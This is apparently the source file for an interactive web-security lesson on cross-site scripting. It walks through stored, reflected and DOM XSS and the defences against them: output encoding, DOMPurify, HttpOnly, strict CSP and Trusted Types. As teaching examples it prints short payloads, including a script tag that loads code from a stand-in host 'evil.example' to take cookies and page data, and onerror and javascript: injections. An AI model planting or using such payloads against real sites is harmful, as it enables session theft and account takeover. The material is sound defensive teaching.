(function () {
  const { block, device, db, card, link, both, flow, rt, red, green, amber, gray, note, bad, good, warn } = SD;

  const alice = (tags = [], o = {}) => device(0, -18, Object.assign({ label: "Alice", tags }, o));
  const hacked = (tags = []) => alice(tags, { screen: "red" });
  const forum = (tags = [], o = {}) => block(0, -2, Object.assign({ label: ["Forum", "App"], glyph: "message", tags }, o));
  const comments = (tags = [], o = {}) => db(0, 12, Object.assign({ label: "comments", glyph: "message", tags }, o));
  const mallory = (tags = []) => device(14, 6, { label: "attacker", labelIcon: "skull", screen: "red", tags });
  const evil = (tags = []) => block(-17, -8, { label: ["evil", "example"], glyph: "skull", color: "red", tags });
  const low = (dx = -110, dy = 100) => ({ x: 0, y: -2, dx, dy });
  const high = (dx = -290, dy = -215) => ({ x: 0, y: -2, dx, dy });

  const base = (extra = {}) =>
    Object.assign(
      {
        aa: both("alice", "app", { label: "GET /thread/42", labelAt: 0.5, labelSide: "below" }),
        ad: both("app", "db"),
      },
      extra
    );
  const post = link("mallory", "app", { label: "POST /comments", labelTone: "red" });
  const exfil = (o = {}) => link("alice", "evil", Object.assign({ style: "dashed", tone: "red", label: "cookies + page data", labelTone: "red", labelAt: 0.62 }, o));

  SD.lesson({
    id: "xss",
    title: "Cross-Site Scripting (XSS)",
    summary: "Attacker JavaScript running inside your origin: how it gets in, what it can do, and the layers that stop it.",
    minutes: 15,
    level: "intermediate",
    metrics: [
      { id: "runs", label: "Script runs for", icon: "code" },
      { id: "gets", label: "Attacker gets", icon: "eye" },
      { id: "defense", label: "Defense", icon: "shield" },
    ],
    legend: [["mine", "Alice"], ["poison", "attacker script"], ["res", "safe page"], ["secret", "stolen data"]],
    goals: [
      { text: "How stored XSS reaches every viewer", step: 1 },
      { text: "Why same-origin access is the real damage", step: 2 },
      { text: "Stored, reflected and DOM XSS", step: 3 },
      { text: "Context-aware output encoding", step: 4 },
      { text: "What HttpOnly does and doesn't stop", step: 6 },
      { text: "A strict, nonce-based CSP", step: 7 },
    ],
    steps: [
      {
        short: "Comments",
        chapter: "setup",
        title: "A forum that pastes comments into HTML",
        body: [
          "Alice reads thread #42 on a forum. The server builds the page by gluing each saved comment into the HTML: <code>html += \"&lt;p&gt;\" + c.body + \"&lt;/p&gt;\"</code>, then sends the result to her browser.",
          "For normal comments that's fine. <code>Great post!</code> becomes <code>&lt;p&gt;Great post!&lt;/p&gt;</code>. The catch is that the browser doesn't know which parts of that HTML the developer wrote and which parts a user typed. It parses and runs all of it.",
        ],
        callout: { kind: "insight", text: "Same root cause as SQL injection: data mixed into code. The interpreter this time is the victim's browser." },
        metrics: { runs: "-", gets: "-", defense: warn("none") },
        scene: {
          entities: {
            alice: alice([note("reads thread #42", "eye")]),
            app: forum([amber("\"<p>\" + c.body + \"</p>\"", "code")]),
            db: comments([note("Great post!", "message")]),
            card: card(low(), "How a comment renders", ["html += \"<p>\" + c.body + \"</p>\"", "# \"Great post!\" -> <p>Great post!</p>", "# the browser parses whatever comes back"], { icon: "code" }),
          },
          links: base(),
          flows: [rt(["aa", "ad"], "mine", { rate: 0.8 })],
        },
      },
      {
        short: "Stored",
        chapter: "attack",
        title: "Stored XSS: one comment, every reader",
        body: [
          "The attacker posts a comment that is really a script tag: <code>&lt;script src=//evil.example/x.js&gt;&lt;/script&gt;</code>. The forum saves it like any other comment.",
          "Now every person who opens thread #42 gets that tag inside the page, and their browser fetches and runs <code>x.js</code>. The script reads what it can and sends it to the attacker's server. Nobody had to click anything except the thread itself.",
        ],
        callout: { kind: "warn", text: "Stored XSS scales with traffic. On a popular page, or on an admin dashboard that renders user content, one payload hits everyone who looks." },
        changes: ["- Script saved as a comment", "- Runs in every viewer's browser", "- Data sent to evil.example"],
        metrics: { runs: bad("every viewer"), gets: bad("sessions, page data"), defense: bad("none") },
        scene: {
          entities: {
            alice: hacked([red("runs attacker JS", "code")]),
            app: forum([red("echoes it unescaped", "alert")]),
            db: comments([red("payload stored", "message")]),
            mallory: mallory([red("<script src=//evil.example/x.js>", "terminal")]),
            evil: evil([red("collects sessions", "download")]),
            card: card(low(-95), "What thread #42 now contains", ["<p>Great post!</p>", "! <p><script src=//evil.example/x.js>", "!    </script></p>", "# every viewer's browser runs it"], { icon: "code" }),
          },
          links: base({ ma: post, ae: exfil() }),
          flows: [flow(["ma", "ad"], "poison", { rate: 0.5 }), rt(["aa", "ad"], "mine", { rate: 0.7, back: "poison", delay: 0.4 }), flow("ae", "secret", { rate: 0.8, delay: 1.2 })],
        },
      },
      {
        short: "Same origin",
        chapter: "insight",
        title: "Why it's worse than stealing a cookie",
        body: [
          "The injected script runs with the forum's <span class=\"term\">origin</span>. To the browser it is the forum's own code. It can read anything on the page, including CSRF tokens and personal data, and it can call any API with Alice's cookies attached.",
          "So the attacker doesn't need the cookie at all. The script can call <code>fetch('/api/account/email', {method: 'POST'})</code> to change Alice's email, then request a password reset to that address. Or it can draw a fake \"session expired\" login box. Whatever Alice can do on the site, the script can do too.",
        ],
        callout: { kind: "insight", text: "In an interview, describe XSS impact as <b>full account takeover in that origin</b>, not as \"pops an alert box\"." },
        changes: ["- Script calls APIs as Alice", "- Email changed, then password reset", "~ Cookie theft is optional"],
        metrics: { runs: bad("every viewer"), gets: bad("Alice's account"), defense: bad("none") },
        scene: {
          entities: {
            alice: hacked([red("script acts as Alice", "userX")]),
            app: forum([red("POST /api/account/email: 200", "mail")]),
            db: comments([red("payload stored", "message")]),
            mallory: mallory([red("waits for the reset email", "mail")]),
            evil: evil([red("receives page data", "download")]),
            card: card(low(-95), "What the script can do", ["read the DOM, CSRF tokens, PII", "call any API with Alice's cookies", "change email -> reset password", "show a fake login prompt", "! anything Alice can do, it can do"], { icon: "unlock" }),
          },
          links: base({ aa: both("alice", "app", { label: "fetch('/api/account/email')", labelAt: 0.5, labelSide: "below", labelTone: "red" }), ae: exfil({ label: "page data" }) }),
          flows: [flow("aa", "poison", { rate: 0.9 }), flow("ae", "secret", { rate: 0.6, delay: 0.8 })],
        },
      },
      {
        short: "Reflected & DOM",
        chapter: "attack",
        title: "Reflected and DOM XSS: delivered by a link",
        body: [
          "<b>Reflected</b>: the search page prints the query back, <code>Results for &lt;q&gt;</code>, without encoding it. The attacker sends Alice a link like <code>/search?q=&lt;script&gt;...</code>. Nothing is stored; the payload rides in the URL and the server echoes it into the response.",
          "<b>DOM-based</b>: the server is fine, but client-side JavaScript copies something attacker-controlled into a dangerous sink, for example <code>el.innerHTML = location.hash.slice(1)</code>. The part after <code>#</code> is never even sent to the server, so server-side filters and logs never see it.",
        ],
        callout: { kind: "tip", text: "Sources to watch: <code>location</code>, <code>document.referrer</code>, <code>postMessage</code> data, storage. Sinks: <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>setTimeout(string)</code>, <code>href</code>." },
        changes: ["- Payload rides in the URL", "- Server echoes it, or client JS writes it", "~ Needs a click, not storage"],
        metrics: { runs: bad("whoever clicks"), gets: bad("their session"), defense: bad("none") },
        scene: {
          entities: {
            alice: hacked([red("clicked the link", "link")]),
            app: forum([red("echoes ?q= into the page", "search")], { label: ["Search", "Page"], glyph: "search" }),
            mallory: mallory([red("sends a crafted link", "mail")]),
            card: card(high(-330, -240), "Three ways in", ["stored     DB -> page         every viewer", "reflected  URL -> response    whoever clicks", "DOM        URL -> client JS   server never sees", "# el.innerHTML = location.hash.slice(1)"], { icon: "route" }),
          },
          links: {
            aa: both("alice", "app", { label: "GET /search?q=<script>", labelAt: 0.5, labelSide: "below", labelTone: "red" }),
            ml: link("mallory", "alice", { style: "dashed", tone: "red", label: "crafted link", labelTone: "red", labelAt: 0.35 }),
          },
          flows: [flow("ml", "poison", { rate: 0.5 }), rt("aa", "poison", { rate: 0.7, back: "poison", delay: 0.8 })],
        },
      },
      {
        short: "Encode",
        chapter: "solution",
        title: "Encode output for the context it lands in",
        body: [
          "The core fix is <span class=\"term\">output encoding</span>: convert characters that mean something in the target context into harmless forms at the moment you render. In HTML text, <code>&lt;</code> becomes <code>&amp;lt;</code>, so the browser shows <code>&lt;script&gt;</code> as text instead of running it.",
          "Context matters. Attributes must be quoted and encoded. Data going into JavaScript should be JSON-encoded, ideally into a data attribute rather than an inline script. URLs need a scheme check so <code>javascript:</code> can't sneak in. Modern templates (React, Angular, Jinja2 with autoescape) handle the HTML-text case for you by default.",
        ],
        callout: { kind: "tip", text: "Encode on output, not on input. Input filtering can't know whether the value will end up in HTML, a URL, JSON or a CSV." },
        changes: ["+ Auto-escaping templates", "~ Payload renders as text", "+ URL scheme allowlist"],
        metrics: { runs: good("nobody"), gets: good("nothing"), defense: good("output encoding") },
        scene: {
          entities: {
            alice: alice([green("shows <script> as text", "check")]),
            app: forum([green("auto-escaping templates", "shieldCheck")]),
            db: comments([amber("payload stored as text", "message")]),
            mallory: mallory([red("<script src=//evil.example/x.js>", "terminal")]),
            card: card(low(-95), "Encode for the context", ["HTML text   <  ->  &lt;    >  ->  &gt;", "attribute   always quoted, then encoded", "JS data     JSON-encode; no inline JS", "URL         http/https only; encode parts", "= encode at output, not at input"], { icon: "shieldCheck" }),
          },
          links: base({ ma: post }),
          flows: [flow(["ma", "ad"], "poison", { rate: 0.5 }), rt(["aa", "ad"], "mine", { rate: 0.8, back: "res", delay: 0.4 })],
        },
      },
      {
        short: "Escape hatches",
        chapter: "problem",
        title: "The escape hatches that switch encoding off",
        body: [
          "Most real XSS in modern apps comes through the doors frameworks leave open on purpose: React's <code>dangerouslySetInnerHTML</code>, Vue's <code>v-html</code>, Angular's <code>bypassSecurityTrustHtml</code>, Jinja's <code>|safe</code>, Handlebars' triple braces. They exist for rich text, and they render whatever they're given.",
          "Links are the other classic: <code>&lt;a href={user.website}&gt;</code> is encoded correctly and still runs <code>javascript:alert(1)</code> when clicked. If you really need user HTML, run it through a maintained allowlist sanitizer such as <b>DOMPurify</b>. Hand-written regex filters lose that race.",
        ],
        callout: { kind: "warn", text: "In code review, grep for these names first. Each hit is either sanitized input or a bug." },
        changes: ["- Rich-text field rendered raw", "- javascript: URLs in links", "+ DOMPurify for user HTML"],
        metrics: { runs: bad("every viewer"), gets: bad("sessions, page data"), defense: warn("encoding, bypassed") },
        scene: {
          entities: {
            alice: hacked([red("runs attacker JS", "code")]),
            app: forum([red("dangerouslySetInnerHTML", "code")]),
            db: comments([red("rich text with <img onerror>", "message")]),
            mallory: mallory([red("<img src=x onerror=...>", "terminal")]),
            evil: evil([red("collects sessions", "download")]),
            card: card(low(-95), "Ways around auto-escaping", ["! React    dangerouslySetInnerHTML", "! Vue      v-html", "! Angular  bypassSecurityTrustHtml", "! Jinja |safe, Handlebars {{{ }}}", "! <a href={url}>  with javascript:", "= rich text: DOMPurify allowlist"], { icon: "alert" }),
          },
          links: base({ ma: post, ae: exfil() }),
          flows: [flow(["ma", "ad"], "poison", { rate: 0.5 }), rt(["aa", "ad"], "mine", { rate: 0.7, back: "poison", delay: 0.4 }), flow("ae", "secret", { rate: 0.8, delay: 1.2 })],
        },
      },
      {
        short: "HttpOnly",
        chapter: "tradeoff",
        title: "HttpOnly: protects the cookie, not the account",
        body: [
          "Setting <code>HttpOnly</code> on the session cookie hides it from <code>document.cookie</code>. The script from the last step can no longer copy the session and replay it from the attacker's machine. That's worth having.",
          "But the script is already running inside Alice's tab. Every <code>fetch()</code> it makes still carries the cookie automatically, so it can change her email, read her messages or post as her for as long as the page is open. HttpOnly cuts off one route out. It does nothing about the attacker acting from inside.",
        ],
        callout: { kind: "insight", text: "A good interview line: HttpOnly limits <b>session theft</b>, not <b>session riding</b>. Keep it on, and don't call it an XSS fix." },
        changes: ["+ Session cookie is HttpOnly", "- In-page requests still authenticated"],
        metrics: { runs: bad("every viewer"), gets: warn("actions, not cookie"), defense: warn("HttpOnly") },
        scene: {
          entities: {
            alice: hacked([amber("cookie: HttpOnly", "cookie")]),
            app: forum([red("POST /api/account/email: 200", "mail")]),
            db: comments([red("payload stored", "message")]),
            mallory: mallory([amber("can't copy the session", "cookie")]),
            evil: evil([gray("no cookie arrives", "eyeOff")]),
            card: card(low(-95), "HttpOnly helps, a little", ["= document.cookie can't read the session", "! fetch('/api/...') still sends it", "! script acts as Alice while the tab is open", "# keep it on; it's not an XSS fix"], { icon: "cookie" }),
          },
          links: base({ aa: both("alice", "app", { label: "fetch('/api/account/email')", labelAt: 0.5, labelSide: "below", labelTone: "red" }), ae: exfil({ label: "document.cookie", fail: 0.6, labelAt: 0.82 }) }),
          flows: [flow("aa", "poison", { rate: 0.9 }), flow("ae", "secret", { rate: 0.6, delay: 0.6 })],
        },
      },
      {
        short: "CSP",
        chapter: "solution",
        title: "Content Security Policy: a backstop in the browser",
        body: [
          "A <span class=\"term\">Content Security Policy</span> tells the browser which scripts it may run. A strict policy gives every legitimate script tag a fresh random <code>nonce</code> per response, and the browser refuses any script without it. An injected <code>&lt;script&gt;</code> doesn't know the nonce, so it never executes.",
          "Add <code>'strict-dynamic'</code> so scripts you trust can load their own dependencies, plus <code>object-src 'none'</code> and <code>base-uri 'none'</code>. Avoid <code>'unsafe-inline'</code> and long domain allowlists, which are routinely bypassed through JSONP endpoints and old libraries on allowed CDNs. Roll it out as <code>Content-Security-Policy-Report-Only</code> first.",
        ],
        callout: { kind: "tip", text: "CSP is defense in depth. Encoding stops the bug; CSP limits the damage when someone forgets." },
        changes: ["+ Nonce-based script-src", "+ strict-dynamic, object-src none", "~ Injected script refused"],
        metrics: { runs: good("nobody"), gets: good("nothing"), defense: good("encoding + CSP") },
        scene: {
          entities: {
            alice: alice([green("CSP: no nonce, not run", "shieldCheck")]),
            app: forum([green("nonce per response", "shieldCheck")]),
            db: comments([red("payload stored", "message")]),
            mallory: mallory([red("<script src=//evil.example/x.js>", "terminal")]),
            evil: evil([gray("x.js never requested", "eyeOff")]),
            card: card(low(-95), "Content-Security-Policy", ["script-src 'nonce-4f9a2c' 'strict-dynamic';", "object-src 'none'; base-uri 'none'", "= injected <script> has no nonce", "! avoid 'unsafe-inline' and CDN allowlists", "# ship Report-Only first, then enforce"], { icon: "shield" }),
          },
          links: base({ ma: post, ae: exfil({ label: "blocked by CSP", fail: 0.55, labelAt: 0.82 }) }),
          flows: [flow(["ma", "ad"], "poison", { rate: 0.5 }), rt(["aa", "ad"], "mine", { rate: 0.7, back: "poison", delay: 0.4 }), flow("ae", "secret", { rate: 0.6, delay: 1.2 })],
        },
      },
      {
        short: "Uploads",
        chapter: "technique",
        title: "Uploads: serve user files from another origin",
        body: [
          "An SVG is XML that can carry script: <code>&lt;svg onload=\"fetch(...)\"&gt;</code>. If the forum serves uploaded avatars from <code>forum.example/uploads/</code>, opening that file runs the script in the forum's origin, which makes it stored XSS through the file feature. HTML, XML and mislabeled files do the same.",
          "Serve user files from a separate, cookieless domain such as <code>forum-usercontent.example</code>. A script there has no session and no access to the forum. Add <code>Content-Disposition: attachment</code> for anything that isn't an image you've re-encoded, and <code>X-Content-Type-Options: nosniff</code> so browsers don't guess types.",
        ],
        callout: { kind: "insight", text: "This is why big platforms use separate user-content domains: googleusercontent.com, githubusercontent.com." },
        changes: ["+ Uploads served from a sandbox domain", "+ Content-Disposition: attachment", "+ nosniff header"],
        metrics: { runs: good("throwaway origin"), gets: good("nothing useful"), defense: good("sandbox domain") },
        scene: {
          entities: {
            alice: alice([green("script stuck on usercontent", "shieldCheck")]),
            app: forum([green("stores upload elsewhere", "upload")]),
            mallory: mallory([red("avatar.svg with <script>", "image")]),
            cdn: block(-17, -8, { label: ["user", "content"], glyph: "image", color: "teal", tags: [green("no cookies, no session", "cookie")] }),
            card: card(low(-95), "User uploads", ["avatar.svg  <svg onload=\"fetch(...)\">", "! served from forum.example = stored XSS", "= separate domain, no cookies", "= Content-Disposition: attachment", "= X-Content-Type-Options: nosniff"], { icon: "upload" }),
          },
          links: {
            ma: link("mallory", "app", { label: "POST /avatar", labelTone: "red" }),
            ac: link("app", "cdn", { label: "copies file" }),
            ca: link("cdn", "alice", { label: "usercontent.example", labelAt: 0.5 }),
          },
          flows: [flow(["ma", "ac"], "poison", { rate: 0.5 }), flow("ca", "poison", { rate: 0.6, delay: 1 })],
        },
      },
      {
        short: "Trusted Types",
        chapter: "technique",
        title: "Trusted Types: lock the DOM sinks",
        body: [
          "DOM XSS hides in client code that grows every sprint. <span class=\"term\">Trusted Types</span> is a CSP mode, <code>require-trusted-types-for 'script'</code>, that makes the browser reject plain strings at dangerous sinks. <code>el.innerHTML = str</code> throws a <code>TypeError</code>.",
          "Code has to pass a <code>TrustedHTML</code> object instead, and those only come from policies you define, usually one that wraps DOMPurify. That turns hundreds of scattered sinks into one small policy file you can review. Start in report-only mode to find every sink, then enforce. It's supported in Chromium-based browsers.",
        ],
        callout: { kind: "tip", text: "Strong senior-level answer: encoding by default, sanitizer for rich text, strict CSP, and Trusted Types to keep DOM XSS from coming back." },
        changes: ["+ require-trusted-types-for 'script'", "+ One reviewed sanitizer policy", "~ Raw strings at sinks throw"],
        metrics: { runs: good("nobody"), gets: good("nothing"), defense: good("encoding + CSP + TT") },
        scene: {
          entities: {
            alice: alice([green("innerHTML rejects strings", "shieldCheck")]),
            app: forum([green("one sanitizer policy", "shieldCheck")], { label: ["Search", "Page"], glyph: "search" }),
            mallory: mallory([red("#<img src=x onerror=...>", "link")]),
            card: card(high(-340, -262), "Trusted Types", ["require-trusted-types-for 'script'", "! el.innerHTML = str          TypeError", "= el.innerHTML = policy.createHTML(str)", "= every sink goes through one policy", "# report-only first to list every sink"], { icon: "shieldCheck" }),
          },
          links: {
            aa: both("alice", "app", { label: "GET /search", labelAt: 0.5, labelSide: "below" }),
            ml: link("mallory", "alice", { style: "dashed", tone: "red", label: "crafted link", labelTone: "red", labelAt: 0.35 }),
          },
          flows: [flow("ml", "poison", { rate: 0.5, blocked: true }), rt("aa", "mine", { rate: 0.7, back: "res", delay: 0.6 })],
        },
      },
      {
        short: "Recap",
        chapter: "recap",
        title: "Recap: where XSS lives and what stops it",
        body: [
          `<table class="compare">
            <thead><tr><th>Type</th><th>Where the bug is</th><th>Main fix</th></tr></thead>
            <tbody>
              <tr><td>Stored</td><td>Server renders saved input</td><td>Output encoding</td></tr>
              <tr><td>Reflected</td><td>Server echoes the request</td><td>Output encoding</td></tr>
              <tr><td>DOM</td><td>Client JS writes to a sink</td><td>Safe APIs, Trusted Types</td></tr>
              <tr><td>Rich text</td><td>Framework escape hatch</td><td>DOMPurify</td></tr>
              <tr><td>Uploads</td><td>Files served same-origin</td><td>Sandbox domain, nosniff</td></tr>
              <tr><td>Backstop</td><td>Any of the above</td><td>Strict nonce CSP</td></tr>
            </tbody>
          </table>`,
          "Interview shortcut: XSS is attacker JavaScript running in your origin, so the impact is anything the user can do. Fix it with context-aware encoding, sanitize rich text, add a strict CSP, and say why HttpOnly alone isn't enough.",
        ],
        callout: { kind: "next", text: "Next: <b>CSRF</b>. No script runs on your site at all; the attacker just gets the victim's browser to send a request with their cookies." },
        metrics: { runs: good("nobody"), gets: good("nothing"), defense: good("layered") },
        scene: {
          entities: {
            alice: alice([green("CSP + encoded output", "shieldCheck")]),
            app: forum([green("auto-escaping + nonces", "shieldCheck")]),
            db: comments([amber("payload stored as text", "message")]),
          },
          links: base(),
          flows: [rt(["aa", "ad"], "mine", { rate: 0.8, back: "res" })],
        },
      },
    ],
  });
})();
